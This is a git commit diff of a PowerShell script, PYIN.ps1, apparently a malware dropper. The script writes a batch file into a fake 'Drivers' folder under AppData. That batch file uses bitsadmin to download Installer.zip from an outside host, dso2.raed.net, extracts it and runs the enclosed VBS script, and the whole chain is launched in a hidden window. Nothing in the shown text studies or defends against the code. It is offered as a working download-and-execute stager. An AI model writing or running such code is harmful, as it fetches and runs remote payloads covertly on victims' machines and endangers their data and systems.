cf756a6cb914e613793c55c61fa5ff0d79e1d353
AbdulazizDXT <143551117+AzizDXT@users.noreply.github.com>
2023-10-21 22:31:15 +0400

    Update PYIN.ps1

--- PYIN.ps1
+++ PYIN.ps1
@@ -1,29 +1,33 @@
 $scriptContent = @"
-$targetFolder = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Drivers"
-$compressedFileUrl = "https://dso2.raed.net:454/files/Installer.zip"
-$vbsScriptPath = "$targetFolder\VSHS.vbs"
+@echo off
+set "targetFolder=C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Drivers"
+set "compressedFileUrl=https://dso2.raed.net:454/files/Installer.zip"
+set "vbsScriptPath=%targetFolder%\VSHS.vbs"
 
-# Create the target folder if it doesn't exist
-New-Item -Path $targetFolder -ItemType Directory -Force
+:: Create the target folder if it doesn't exist
+if not exist "%targetFolder%" (
+    mkdir "%targetFolder%"
+)
 
-# Download the compressed file
-$compressedFilePath = Join-Path -Path $targetFolder -ChildPath "Installer.zip"
-Invoke-WebRequest -Uri $compressedFileUrl -OutFile $compressedFilePath
+:: Download the compressed file
+bitsadmin.exe /transfer myDownloadJob /download /priority NORMAL %compressedFileUrl% "%targetFolder%\Installer.zip"
 
-# Extract the contents of the compressed file to the target folder
-Expand-Archive -Path $compressedFilePath -DestinationPath $targetFolder -Force
+:: Extract the contents of the compressed file to the target folder
+expand "%targetFolder%\Installer.zip" "%targetFolder%" -F:*
 
-# Run the VBS script
-Start-Process -FilePath "wscript.exe" -ArgumentList $vbsScriptPath -WindowStyle Hidden
+cd "%vbsScriptPath%"
+:: Run the VBS script
+wscript.exe "%vbsScriptPath%"
 "@
 
 # Define the path to the script file
-$scriptFilePath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\WIN.ps1"
+$scriptFilePath = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\WIN.bat"
 
 # Write the script content to the file
 $scriptContent | Out-File -FilePath $scriptFilePath -Encoding utf8
 
-# Run the script
-Start-Process -FilePath "powershell.exe" -ArgumentList "-File $scriptFilePath" -WindowStyle Hidden
+# Run the script in the background
+Start-Process -FilePath "cmd.exe" -ArgumentList "/C $scriptFilePath" -WindowStyle Hidden
 
+# Exit the main script
 exit
